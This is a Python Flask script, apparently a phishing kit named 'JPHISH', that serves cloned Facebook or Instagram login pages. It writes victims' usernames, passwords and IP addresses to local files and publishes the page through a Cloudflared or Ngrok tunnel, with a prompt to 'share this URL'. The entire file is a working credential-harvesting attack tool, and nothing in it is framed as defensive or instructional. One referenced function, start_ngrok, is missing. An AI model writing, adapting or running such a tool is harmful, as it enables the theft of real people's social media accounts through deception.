import os
import subprocess
import time
import sys
import platform
import shutil
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Detect OS and Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install Cloudflared (updated for Termux)
def install_cloudflared():
    try:
        if is_termux():
            print("\n[+] Installing Cloudflared for Termux...")
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
            return True
        else:
            print("\n[+] Installing Cloudflared for Linux/macOS...")
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
            return True
    except Exception as e:
        print(f"\n[!] Failed to install Cloudflared: {e}")
        return False

# Start Cloudflared (updated for global access)
def start_cloudflared(port=8080):
    tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
    if not tool_path:
        print("\n[!] Cloudflared not found.")
        if input("Install Cloudflared? (y/n): ").strip().lower() == "y":
            if not install_cloudflared():
                return None
            tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
        else:
            return None

    try:
        # Start Cloudflared tunnel (global access)
        process = subprocess.Popen(
            [tool_path, "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)  # Wait for tunnel to initialize

        # Extract the public URL from Cloudflared output
        for line in process.stderr:
            if "trycloudflare.com" in line:
                public_url = line.split("|")[-1].strip()
                print(f"\n[+] Cloudflared tunnel active! Public URL: {public_url}")
                return public_url
        return None
    except Exception as e:
        print(f"\n[!] Failed to start Cloudflared: {e}")
        return None

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    choice = input("\nEnter choice (1/2): ").strip()

    print("\n[+] Select Tunnel Service:")
    print("1. Cloudflared (Recommended for Termux)")
    print("2. Ngrok")
    tunnel_choice = input("\nEnter choice (1/2): ").strip()

    # Start the selected tunnel
    public_url = None
    if tunnel_choice == "1":
        public_url = start_cloudflared()
        if not public_url:
            sys.exit(1)
    elif tunnel_choice == "2":
        ngrok_token = input("\nNgrok Auth Token: ").strip()
        if not start_ngrok(ngrok_token):
            sys.exit(1)
    else:
        print("\n[!] Invalid choice. Exiting.")
        sys.exit(1)

    # Start Flask with the selected phishing page
    if choice == "1":
        @app.route('/')
        def home():
            return render_template('facebook.html')

        @app.route('/login', methods=['POST'])
        def login():
            username = request.form.get('email')
            password = request.form.get('pass')
            log_credentials(username, password, 'Facebook')
            return redirect("https://facebook.com")
    else:
        @app.route('/')
        def home():
            return render_template('instagram.html')

        @app.route('/login', methods=['POST'])
        def login():
            username = request.form.get('username')
            password = request.form.get('password')
            log_credentials(username, password, 'Instagram')
            return redirect("https://instagram.com")

    print(f"\n[+] Phishing page active! Share this URL: {public_url}")

if __name__ == '__main__':
    setup()
    app.run(host='0.0.0.0', port=8080)  # Allow external connections
